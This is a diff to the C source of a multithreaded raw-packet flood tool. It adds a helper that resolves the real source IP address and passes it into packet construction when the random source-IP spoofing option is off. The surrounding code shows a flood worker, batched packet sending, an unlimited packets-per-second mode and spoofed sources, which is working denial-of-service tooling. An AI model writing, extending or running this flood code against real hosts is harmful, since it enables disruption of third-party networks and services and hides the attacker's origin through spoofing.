@@ -92,6 +92,34 @@ static inline uint16_t rand_port(void) {
     return (uint16_t)(1024 + (fast_rand() % 64511));
 }
 
+static int resolve_source_ip(uint32_t dst_ip, uint16_t dst_port, uint32_t *src_ip) {
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) return -1;
+
+    struct sockaddr_in dst = {
+        .sin_family      = AF_INET,
+        .sin_addr.s_addr = htonl(dst_ip),
+        .sin_port        = htons(dst_port ? dst_port : 9),
+    };
+
+    if (connect(sock, (struct sockaddr *)&dst, sizeof(dst)) != 0) {
+        close(sock);
+        return -1;
+    }
+
+    struct sockaddr_in local = {0};
+    socklen_t len = sizeof(local);
+    if (getsockname(sock, (struct sockaddr *)&local, &len) != 0 ||
+        local.sin_addr.s_addr == 0) {
+        close(sock);
+        return -1;
+    }
+
+    *src_ip = ntohl(local.sin_addr.s_addr);
+    close(sock);
+    return 0;
+}
+
 /* --------------------------------------------------------------------------
  * Checksum (RFC 1071)
  * -------------------------------------------------------------------------- */
@@ -143,11 +171,11 @@ typedef enum {
 
 /* Build a packet into buf, returns total packet length */
 static int build_packet(uint8_t *buf, uint32_t dst_ip, uint16_t dst_port,
-                        PktType type, int spoof) {
+                        uint32_t real_src_ip, PktType type, int spoof) {
     memset(buf, 0, MAX_PKT_SIZE);
 
     struct iphdr  *ip  = (struct iphdr  *)buf;
-    uint32_t src_ip = spoof ? rand_ip() : 0;  /* 0 = kernel fills */
+    uint32_t src_ip = spoof ? rand_ip() : real_src_ip;
 
     /* --- Common IP header --- */
     ip->ihl      = 5;
@@ -237,6 +265,7 @@ static int build_packet(uint8_t *buf, uint32_t dst_ip, uint16_t dst_port,
 typedef struct {
     uint32_t  dst_ip;
     uint16_t  dst_port;
+    uint32_t  src_ip;
     PktType   type;
     int       spoof;
     long      pps_limit;    /* 0 = unlimited */
@@ -286,7 +315,7 @@ static void *flood_worker(void *arg) {
         /* Build batch */
         for (int i = 0; i < BATCH_SIZE; i++) {
             int pkt_len = build_packet(pkts[i], a->dst_ip, a->dst_port,
-                                       a->type, a->spoof);
+                                       a->src_ip, a->type, a->spoof);
             iovs[i].iov_base  = pkts[i];
             iovs[i].iov_len   = pkt_len;
             addrs[i]          = dst;
@@ -343,9 +372,15 @@ int flood_start(const char *dst_ip_str, int port, int threads,
 
     g_args.dst_ip    = ntohl(addr.s_addr);
     g_args.dst_port  = (uint16_t)port;
+    g_args.src_ip    = 0;
     g_args.type      = (PktType)pkt_type;
     g_args.spoof     = spoof;
     g_args.pps_limit = pps_limit;
+
+    if (!spoof && resolve_source_ip(g_args.dst_ip, g_args.dst_port,
+                                    &g_args.src_ip) != 0) {
+        return -1;
+    }
 
     atomic_store(&g_running, 1);
     atomic_store(&g_packets_sent, 0);
